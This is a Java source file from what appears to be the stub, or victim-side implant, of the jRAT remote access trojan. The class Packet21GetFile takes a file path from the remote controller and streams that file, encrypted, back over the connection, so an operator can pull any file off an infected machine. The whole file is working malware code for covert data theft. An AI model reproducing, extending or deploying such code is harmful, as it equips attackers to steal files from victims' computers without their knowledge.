package pro.jrat.stub.packets.incoming;

import java.io.File;

import pro.jrat.common.io.FileIO;
import pro.jrat.stub.Connection;
import pro.jrat.stub.Main;
import pro.jrat.stub.packets.outgoing.Packet29SendFile;


public class Packet21GetFile extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		File file = new File(Connection.readLine());

		if (file.exists() && file.isFile()) {
			Connection.addToSendQueue(new Packet29SendFile(file.getName(), file.getAbsolutePath()));

			FileIO.writeFile(file, Connection.dos, null, Main.getKey());

			Connection.lock();
		}
	}

}
